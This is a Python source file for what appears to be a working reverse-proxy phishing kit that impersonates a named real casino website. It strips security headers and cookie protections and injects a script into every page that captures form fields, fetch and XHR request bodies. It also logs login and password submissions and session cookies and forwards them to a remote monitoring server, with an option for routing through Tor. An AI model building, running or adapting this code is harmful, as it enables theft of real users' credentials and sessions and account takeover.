import re
import time
import uuid
import json
import asyncio
import httpx
import websockets
from typing import Dict, List, Any
from datetime import datetime
from contextlib import asynccontextmanager
from bs4 import BeautifulSoup
from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse, JSONResponse, HTMLResponse
from urllib.parse import urljoin, urlparse
from httpx_socks import AsyncProxyTransport
import os
from dotenv import load_dotenv

load_dotenv()
proxy_setting = os.getenv("PROXY_URL")
MONITORING_URL = os.getenv("MONITORING_URL")
MONITORING_API_KEY = os.getenv("MONITORING_API_KEY")
print(MONITORING_API_KEY)

# =========================================================
# [CONFIGURATION & CONSTANTS]
# =========================================================


TARGET_BASE = "https://www.veravegas.com/" 
parsed_target = urlparse(TARGET_BASE)
TARGET_DOMAIN = parsed_target.netloc

# Strips CSP and prevents raw browser cookies from leaking
HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate",
    "proxy-authorization", "te", "trailers",
    "transfer-encoding", "upgrade", "host", "content-length",
    "content-encoding", "accept-encoding", "content-security-policy",
    "cookie" 
}

COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")
AUTH_KEYWORDS = ["login", "auth", "signin", "token", "password"]

SESSION_FILE = "proxy_sessions.json"
SESSION_TIMEOUT = 1800

# =========================================================
# [ADVANCED UTILITIES & PARSERS]
# =========================================================
def rewrite_url(url: str, target_domain: str, proxy_domain: str, base_url: str = None) -> str:
    """Safely replace target domain with proxy domain, supporting relative & protocol-relative URLs."""
    if not url:
        return url
        
    # Handle protocol-relative URLs (//example.com/script.js)
    if url.startswith("//" + target_domain):
        url = "https:" + url

    # Resolve relative URLs to absolute if a base is provided
    if base_url and url.startswith("/") and not url.startswith("//"):
        url = urljoin(base_url, url)

    if target_domain in url:
        rewritten = url.replace(target_domain, proxy_domain)
        rewritten = rewritten.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
        return rewritten
    return url

def rewrite_css(css_text: str, target_domain: str, proxy_domain: str) -> str:
    """Finds and rewrites url(...) declarations inside CSS rules."""
    if not css_text:
        return css_text
    
    def replacer(match):
        orig_url = match.group(2)
        new_url = rewrite_url(orig_url, target_domain, proxy_domain)
        return f"url({match.group(1)}{new_url}{match.group(3)})"
        
    return re.sub(r'url\(([\'"]?)(.*?)([\'"]?)\)', replacer, css_text)

def rewrite_json(data: Any, target_domain: str, proxy_domain: str) -> Any:
    """Recursively traverse JSON payloads to rewrite target domains."""
    if isinstance(data, dict):
        return {k: rewrite_json(v, target_domain, proxy_domain) for k, v in data.items()}
    elif isinstance(data, list):
        return [rewrite_json(item, target_domain, proxy_domain) for item in data]
    elif isinstance(data, str):
        return rewrite_url(data, target_domain, proxy_domain)
    return data

# =========================================================
# [LOGGER MODULE] 
# =========================================================

def clean_payload(data: dict) -> dict:
    """Remove null, empty string, or empty dict values recursively."""
    if isinstance(data, dict):
        return {k: clean_payload(v) for k, v in data.items() if v not in (None, "", {})}
    elif isinstance(data, list):
        return [clean_payload(x) for x in data if x not in (None, "", {})]
    return data


class ProxyLogger:
    def __init__(self, max_logs=1000):
        self.logs: List[dict] = []
        self.max_logs = max_logs
        self.lock = asyncio.Lock()

    async def log_event(self, event_type: str, session_id: str = "N/A", method: str = "-", path: str = "-", status: int = 0, data: dict = None):
        entry = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": event_type,
            "session_id": session_id,
            "method": method,
            "path": path,
            "status": status,
            "data": data or {}
        }
        async with self.lock:
            self.logs.insert(0, entry)
            if len(self.logs) > self.max_logs:
                self.logs.pop()
        
        asyncio.create_task(send_to_monitoring(entry))

    async def get_logs(self) -> List[dict]:
        async with self.lock:
            return list(self.logs)

proxy_logger = ProxyLogger()

# =========================================================
# [SESSION MANAGER MODULE]
# =========================================================
class SessionManager:
    def __init__(self):
        self.sessions: Dict[str, dict] = {}
        self.lock = asyncio.Lock()

    async def load(self):
        try:
            with open(SESSION_FILE, "r") as f:
                data = json.load(f)
                async with self.lock:
                    self.sessions = data
            print(f"[*] Loaded {len(self.sessions)} sessions from disk.")
        except (FileNotFoundError, json.JSONDecodeError):
            print("[*] No existing session file found. Starting fresh.")

    async def save(self):
        async with self.lock:
            with open(SESSION_FILE, "w") as f:
                json.dump(self.sessions, f)

    async def get_or_create_session(self, session_id: str = None) -> str:
        async with self.lock:
            now = time.time()
            if session_id and session_id in self.sessions:
                self.sessions[session_id]["last_accessed"] = now
                return session_id
            
            new_id = str(uuid.uuid4())
            self.sessions[new_id] = {"cookies": {}, "last_accessed": now}
            asyncio.create_task(proxy_logger.log_event("session_created", session_id=new_id, data={"action": "new_session"}))
            return new_id

    async def get_cookies(self, session_id: str) -> dict:
        async with self.lock:
            session = self.sessions.get(session_id)
            if session:
                session["last_accessed"] = time.time()
                return session["cookies"].copy()
            return {}

    async def update_cookies(self, session_id: str, new_cookies: dict):
        if not new_cookies:
            return
        async with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]["cookies"].update(new_cookies)
        asyncio.create_task(self.save())

    async def cleanup_loop(self):
        while True:
            await asyncio.sleep(60) 
            now = time.time()
            expired_keys = []
            async with self.lock:
                for sid, data in self.sessions.items():
                    if now - data["last_accessed"] > SESSION_TIMEOUT:
                        expired_keys.append(sid)
                for sid in expired_keys:
                    del self.sessions[sid]
            
            if expired_keys:
                print(f"[*] Cleaned up {len(expired_keys)} expired sessions.")
                await self.save()

session_manager = SessionManager()

@asynccontextmanager
async def lifespan(app: FastAPI):
    await session_manager.load()
    cleanup_task = asyncio.create_task(session_manager.cleanup_loop())
    yield
    cleanup_task.cancel()
    await session_manager.save()

# =========================================================
# [APP INIT]
# =========================================================
app = FastAPI(lifespan=lifespan)

if proxy_setting:
    print(f"[*] Initializing Proxy with: {proxy_setting}")
    client = httpx.AsyncClient(
        proxy=proxy_setting,
        follow_redirects=False,
        timeout=60.0,
        # Verification is often disabled for local testing to prevent SSL errors
        verify=False 
    )
else:
    print("[*] No proxy detected. Using direct/VPN connection.")
    client = httpx.AsyncClient(
        follow_redirects=False, 
        timeout=60.0
    )

# =========================================================
# ADVANCED CLIENT-SIDE CAPTURE SCRIPT
# =========================================================
FORM_OBSERVER_SCRIPT = """
<script>
(function() {
    function sendCapture(type, url, method, payload) {
        try {
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: type,
                    url: url,
                    method: method.toUpperCase(),
                    payload: payload
                }),
                keepalive: true
            });
        } catch (err) {}
    }

    // 1. FORM CAPTURE
    function attachFormListeners() {
        document.querySelectorAll('form').forEach(form => {
            if (form.dataset.observerAttached) return;
            form.dataset.observerAttached = 'true';

            form.addEventListener('submit', function(e) {
                const formData = {};
                form.querySelectorAll('input, textarea, select').forEach(input => {
                    const name = input.name || input.id;
                    if (name) formData[name] = (input.type === 'checkbox' || input.type === 'radio') ? input.checked : input.value;
                });
                sendCapture('form', form.action || window.location.href, form.method || 'GET', formData);
            }, true); 
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', attachFormListeners);
    } else {
        attachFormListeners();
    }
    new MutationObserver(() => attachFormListeners()).observe(document.documentElement, { childList: true, subtree: true });

    // 2. FETCH API CAPTURE
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const resource = args[0];
        const config = args[1] || {};
        
        let url = typeof resource === 'string' ? resource : (resource instanceof Request ? resource.url : '');
        let method = config.method || 'GET';
        let payload = config.body ? config.body.toString() : {};
        
        if (url !== '/capture') {
            sendCapture('fetch', url, method, { request_body: payload });
        }
        return originalFetch.apply(this, args);
    };

    // 3. XHR (AJAX) CAPTURE
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        this._method = method;
        this._url = url;
        return originalOpen.call(this, method, url, ...rest);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
        if (this._url !== '/capture') {
            sendCapture('xhr', this._url, this._method, { request_body: body ? body.toString() : null });
        }
        return originalSend.call(this, body);
    };
})();
</script>
"""

# =========================================================
# [CAPTURE ENDPOINT]
# =========================================================

    # await proxy_logger.log_event(
    #     event_type=f"capture_{capture_type}", 
    #     session_id=client_session_id, 
    #     method=data.get("method", "POST"), 
    #     path=data.get("url", "/capture"), 
    #     data=data.get("payload", {})
    # )

@app.post("/capture")
async def capture_form_data(request: Request, data: dict):
    client_session_id = request.cookies.get("proxy_session_id", "N/A")
    capture_type = data.get("type", "unknown")
    payload = data.get("payload", {})

    # Clean payload before logging
    cleaned_payload = clean_payload(payload)

    log_data = {
        "captured_type": capture_type,
        "request_payload": payload,
        "client_cookies": dict(request.cookies)
    }

    await proxy_logger.log_event(
        f"capture_{capture_type}",
        session_id=client_session_id,
        method=data.get("method", "POST"),
        path=data.get("url", "/capture"),
        data=log_data
    )
    return JSONResponse(content={"status": "captured"}, status_code=200)

# =========================================================
# [ROBUST WEBSOCKET PROXY MODULE] 
# =========================================================
@app.websocket("/{path:path}")
async def websocket_proxy(websocket: WebSocket, path: str):
    await websocket.accept()
    
    client_session_id = websocket.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create_session(client_session_id)
    session_cookies = await session_manager.get_cookies(session_id)
    
    cookie_str = "; ".join([f"{k}={v}" for k, v in session_cookies.items()])
    ws_headers = {"Cookie": cookie_str} if cookie_str else {}

    ws_base = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
    target_ws_url = urljoin(ws_base.rstrip("/") + "/", path)
    
    if websocket.url.query:
        target_ws_url += f"?{websocket.url.query}"
    
    try:
        async with websockets.connect(target_ws_url, extra_headers=ws_headers) as target_ws:
            async def forward_to_target():
                try:
                    while True:
                        # Raw receive intercepts both Text & Binary frames natively
                        message = await websocket.receive()
                        if "text" in message:
                            await target_ws.send(message["text"])
                        elif "bytes" in message:
                            await target_ws.send(message["bytes"])
                        elif message["type"] == "websocket.disconnect":
                            break
                except Exception as e:
                    await proxy_logger.log_event("ws_client_error", session_id, "WS", f"/{path}", data={"error": str(e)})

            async def forward_to_client():
                try:
                    while True:
                        data = await target_ws.recv()
                        if isinstance(data, str):
                            await websocket.send_text(data)
                        else:
                            await websocket.send_bytes(data)
                except websockets.exceptions.ConnectionClosed:
                    pass
                except Exception as e:
                    await proxy_logger.log_event("ws_upstream_error", session_id, "WS", f"/{path}", data={"error": str(e)})

            await asyncio.gather(forward_to_target(), forward_to_client())
            
    except Exception as e:
        await proxy_logger.log_event("ws_connection_failed", session_id, "WS", f"/{path}", data={"error": str(e)})
    finally:
        try:
            await websocket.close()
        except:
            pass

# =========================================================
# [MONITORING MODULE]
# =========================================================
async def send_to_monitoring(event: dict):
    """
    Sends structured logs to the isolated monitor service.
    """
    if not MONITORING_URL:
        return

    # Map your proxy event to the Monitor's 'LogEntry' schema
    payload = {
        "type": event.get("type", "GENERAL").upper(),
        "source": f"Proxy-{event.get('method', 'REQ')}",
        "data": event.get("data", {}) 
    }

    # transport = AsyncProxyTransport.from_url("socks5://127.0.0.1:9050")
    # transport=transport,
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            await client.post(
                f"{MONITORING_URL.rstrip('/')}/ingest",
                json=payload,
                headers={"X-API-Key": MONITORING_API_KEY},
            )
    except Exception as e:
        print("MONITOR ERROR:", e)

# =========================================================
# [HTTP PROXY MODULE]
# =========================================================
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
async def proxy(request: Request, path: str):
    query_string = request.url.query
    target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
    if query_string:
        target_url += f"?{query_string}"

    proxy_base = str(request.base_url).rstrip("/")
    proxy_domain = urlparse(proxy_base).netloc

    client_session_id = request.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create_session(client_session_id)
    session_cookies = await session_manager.get_cookies(session_id)

    browser_cookies = dict(request.cookies)
    browser_cookies.pop("proxy_session_id", None)
    merged_cookies = {**session_cookies, **browser_cookies}

    req_headers = []
    for k, v in request.headers.items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue
        if k_lower in ("referer", "origin"):
            v = v.replace(proxy_domain, TARGET_DOMAIN)
            v = v.replace("http://", "https://") 
        req_headers.append((k, v))

    req_headers.append(("host", TARGET_DOMAIN))
    req_headers.append(("accept-encoding", "identity"))

    body = await request.body()
    log_data = {}

    if request.method == "POST":
        path_lower = path.lower()
        if any(keyword in path_lower for keyword in AUTH_KEYWORDS):
            try:
                decoded = body.decode('utf-8', errors='replace')
                log_data["payload"] = decoded
                await proxy_logger.log_event("auth_intercept", session_id, request.method, f"/{path}", data=log_data)
            except Exception:
                pass

    try:
        proxy_req = client.build_request(
            method=request.method,
            url=target_url,
            headers=req_headers,
            content=body,
            cookies=merged_cookies
        )
        resp = await client.send(proxy_req, stream=True)
        
        if not log_data:
            log_data = {"request_cookies": merged_cookies}
            log_data = clean_payload(log_data)  # <-- filter nulls
            await proxy_logger.log_event(
                "proxy_request", 
                session_id, 
                request.method, 
                f"/{path}", 
                status=resp.status_code, 
                data=log_data
            )

    except httpx.RequestError as exc:
        await proxy_logger.log_event("proxy_error", session_id, request.method, f"/{path}", data={"error": str(exc)})
        raise HTTPException(status_code=502, detail=f"Proxy Link Error: {str(exc)}")

    if resp.cookies:
        await session_manager.update_cookies(session_id, dict(resp.cookies))

    processed_headers = []
    for k, v in resp.headers.multi_items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue

        if k_lower == "location":
            v = v.replace(TARGET_DOMAIN, proxy_domain).replace("https://", "http://")  
            processed_headers.append((k, v))
        elif k_lower == "set-cookie":
            v = COOKIE_DOMAIN_RE.sub("", v)
            v = re.sub(r"(?i);\s*Secure", "", v)
            v = re.sub(r"(?i);\s*SameSite=None", "; SameSite=Lax", v)
            processed_headers.append((k, v))
        else:
            processed_headers.append((k, v))

    content_type = resp.headers.get("content-type", "").lower()

    if any(t in content_type for t in ["text/html", "javascript", "json", "application/javascript", "text/css"]):
        try:
            raw_bytes = await resp.aread()
        except httpx.ReadError as exc:
            await resp.aclose()
            raise HTTPException(status_code=502, detail="Upstream dropped connection.")

        text = raw_bytes.decode("utf-8", errors="ignore")

        # 1. HTML DOM PARSING
        if "text/html" in content_type:
            soup = BeautifulSoup(text, "html.parser")

            # Standard Href/Src/Action rewriting
            for tag in soup.find_all(['a', 'link', 'base'], href=True):
                tag['href'] = rewrite_url(tag['href'], TARGET_DOMAIN, proxy_domain, TARGET_BASE)
            
            for tag in soup.find_all(['script', 'img', 'iframe', 'source', 'audio', 'video'], src=True):
                tag['src'] = rewrite_url(tag['src'], TARGET_DOMAIN, proxy_domain, TARGET_BASE)
            
            for tag in soup.find_all('form', action=True):
                tag['action'] = rewrite_url(tag['action'], TARGET_DOMAIN, proxy_domain, TARGET_BASE)

            # Meta Refresh rewriting
            for tag in soup.find_all('meta', attrs={'http-equiv': lambda x: x and x.lower() == 'refresh'}):
                content = tag.get('content', '')
                if ';' in content:
                    delay, url_part = content.split(';', 1)
                    if url_part.strip().lower().startswith('url='):
                        orig_url = url_part.strip()[4:].strip('\'"')
                        new_url = rewrite_url(orig_url, TARGET_DOMAIN, proxy_domain, TARGET_BASE)
                        tag['content'] = f"{delay};url={new_url}"

            # Inline Style CSS block rewriting
            for tag in soup.find_all('style'):
                if tag.string:
                    tag.string = rewrite_css(tag.string, TARGET_DOMAIN, proxy_domain)
                    
            # Inline style attribute rewriting
            for tag in soup.find_all(style=True):
                tag['style'] = rewrite_css(tag['style'], TARGET_DOMAIN, proxy_domain)

            # Lightweight inline JS string replacement
            for tag in soup.find_all('script'):
                if tag.string and not tag.get('src'):
                    tag.string = tag.string.replace(TARGET_DOMAIN, proxy_domain)
                    tag.string = tag.string.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")

            # Script Injection
            observer_soup = BeautifulSoup(FORM_OBSERVER_SCRIPT, "html.parser")
            body_tag = soup.find('body')
            if body_tag:
                body_tag.append(observer_soup)
            else:
                soup.append(observer_soup)

            rewritten = str(soup)

        # 2. JSON PAYLOAD PARSING
        elif "application/json" in content_type:
            try:
                data = json.loads(text)
                rewritten_data = rewrite_json(data, TARGET_DOMAIN, proxy_domain)
                rewritten = json.dumps(rewritten_data)
            except json.JSONDecodeError:
                rewritten = text.replace(TARGET_DOMAIN, proxy_domain)
                
        # 3. JS & CSS FALLBACK PARSING
        else:
            rewritten = text.replace(TARGET_DOMAIN, proxy_domain)
            rewritten = rewritten.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
            if "text/css" in content_type:
                rewritten = rewrite_css(rewritten, TARGET_DOMAIN, proxy_domain)

        final_response = Response(
            content=rewritten.encode("utf-8"),
            status_code=resp.status_code,
            media_type=content_type
        )
        await resp.aclose()

    else:
        async def safe_stream_generator():
            try:
                async for chunk in resp.aiter_bytes():
                    yield chunk
            except httpx.ReadError:
                pass
            finally:
                await resp.aclose()

        final_response = StreamingResponse(safe_stream_generator(), status_code=resp.status_code)

    if "content-length" in final_response.headers:
        del final_response.headers["content-length"]

    if client_session_id != session_id:
        final_response.set_cookie(
            key="proxy_session_id",
            value=session_id,
            httponly=True,
            samesite="Lax",
            max_age=SESSION_TIMEOUT
        )

    for k, v in processed_headers:
        if k.lower() in ("content-length", "content-type"):
            continue
        final_response.headers.append(k, v)

    return final_response